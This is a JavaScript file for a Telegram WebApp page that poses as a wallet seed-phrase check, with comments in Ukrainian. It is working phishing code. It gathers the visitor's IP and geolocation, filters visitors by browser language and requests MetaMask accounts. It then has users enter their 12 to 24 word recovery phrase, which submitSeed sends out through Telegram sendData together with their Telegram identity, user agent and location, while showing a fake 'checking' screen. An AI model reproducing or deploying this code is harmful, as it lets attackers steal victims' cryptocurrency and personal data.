// 🌍 IP та геолокація
let userIp = "undefined";
let userLocation = "undefined";

console.log("🌍 IP + геолокація ініціалізується...");
fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
        userIp = data.ip;
        userLocation = `${data.city}, ${data.country_name}`;
        console.log("📍 IP:", userIp, "| Локація:", userLocation);
    })
    .catch(() => {
        userIp = "unknown";
        userLocation = "unknown";
        console.warn("⚠️ Не вдалося отримати геолокацію");
    });

// 🚫 Обмеження за мовою
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
console.log("🌐 Виявлено мови браузера:", langs);
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
    throw new Error("🚫 Заблоковано через мову");
}

// ✅ DOM готовий
window.addEventListener("DOMContentLoaded", async () => {
    console.log("✅ DOM повністю завантажено");

    feather.replace();

    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        console.log("✅ Telegram WebApp ініціалізовано");
    } else {
        console.warn("❌ Telegram WebApp не знайдено");
    }

    if (typeof window.ethereum !== "undefined") {
        console.log("🦊 MetaMask виявлено");
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (accounts && accounts.length > 0) {
                console.log("🦊 MetaMask адреса:", accounts[0]);
                document.getElementById("wallet").value = accounts[0];
            }
        } catch (err) {
            console.warn("⚠️ Помилка авторизації MetaMask:", err);
        }
    } else {
        console.log("🦊 MetaMask не встановлено");
    }

    renderSeedInputs();
    setupSelect();
});

// 📦 Поля для сид-фраз
function renderSeedInputs() {
    const length = parseInt(document.getElementById("length").value);
    const container = document.getElementById("seedContainer");
    container.innerHTML = "";

    for (let i = 0; i < length; i++) {
        const input = document.createElement("input");
        input.type = "text";
        input.placeholder = `${i + 1}`;
        input.classList.add("seed-word");
        container.appendChild(input);
    }

    const firstInput = container.querySelector("input");
    if (firstInput) {
        firstInput.addEventListener("input", handleBulkSeedInput);
        firstInput.addEventListener("paste", (e) => {
            setTimeout(() => handleBulkSeedInput(e), 50);
        });
    }
    console.log(`🆕 Створено ${length} полів для seed-фраз`);
}

// 📋 Автозаповнення сид-фрази
function handleBulkSeedInput(e) {
    const inputs = document.querySelectorAll(".seed-word");
    const text = e.target.value.trim();
    const words = text.split(/\s+/);
    if (words.length > 1) {
        inputs.forEach((input, index) => {
            input.value = words[index] || "";
        });
        console.log("✍️ Автозаповнення сид-фраз:", words.join(" "));
    }
}

// 🎛️ Кастомний селект
function setupSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    const selected = selectWrapper.querySelector('.selected');
    const options = selectWrapper.querySelectorAll('.options li');
    const hiddenInput = document.querySelector('#wallet');

    selected.addEventListener('click', () => {
        selectWrapper.classList.toggle('open');
    });

    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value;
            selectWrapper.classList.remove('open');
            console.log("📥 Обрано гаманець:", option.dataset.value);
        });
    });

    document.addEventListener('click', e => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });
}

// ⚠️ Попередження
function showWarning(message) {
    let warning = document.getElementById("validationWarning");
    if (!warning) {
        warning = document.createElement("p");
        warning.id = "validationWarning";
        warning.style.color = "#ff4d4d";
        warning.style.fontSize = "13px";
        warning.style.marginTop = "10px";
        document.querySelector(".container").appendChild(warning);
    }
    warning.textContent = message;
    warning.style.display = "block";
    console.warn("🚫 Попередження:", message);
}

// 🧹 Приховати попередження
function clearWarning() {
    const warning = document.getElementById("validationWarning");
    if (warning) {
        warning.style.display = "none";
        warning.textContent = "";
    }
}

// 🌀 Показати статус
function showProcessing(message) {
    let processing = document.getElementById("processingInfo");
    if (!processing) {
        processing = document.createElement("p");
        processing.id = "processingInfo";
        processing.style.color = "#999";
        processing.style.fontSize = "14px";
        processing.style.marginTop = "12px";
        document.querySelector(".container").appendChild(processing);
    }
    processing.textContent = message;
    console.log("⏳ Статус:", message);
}

// 🚀 Submit seed-фрази
function submitSeed() {
    clearWarning();

    const length = parseInt(document.getElementById("length").value);
    const wallet = document.getElementById("wallet").value || "unknown";
    const ua = navigator.userAgent;
    const inputs = document.querySelectorAll("#seedContainer .seed-word");
    const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);

    console.log("📋 Введено слів:", words.length, "| Очікується:", length);

    const invalidWords = words.filter(word => !/^[a-zA-Z]+$/.test(word));
    if (invalidWords.length > 0) {
        showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
        return;
    }

    if (isNaN(length) || length < 12 || length > 24 || words.length !== length) {
        showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
        return;
    }

    const seed = words.join(" ");
    localStorage.setItem("last_seed", seed);
    showProcessing("⏳ Перевірка seed-фрази…");
    document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";

    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};

    const payload = {
        user_id: tgUser.id || "-",
        username: tgUser.username || "-",
        seed,
        wallet,
        length,
        ua,
        ip: userIp,
        location: userLocation,
        address: "-",
        balance: "-",
        timestamp: new Date().toISOString()
    };

    console.log("📤 Payload:", payload);
    localStorage.setItem("payload_backup", JSON.stringify(payload));

    if (Telegram?.WebApp?.sendData) {
        Telegram.WebApp.sendData(JSON.stringify(payload));
        console.log("📲 Payload надіслано через Telegram WebApp");
    } else {
        console.warn("❌ Telegram WebApp sendData недоступна");
    }

    setTimeout(() => {
        window.location.href = "profile.html";
    }, 1500);
}
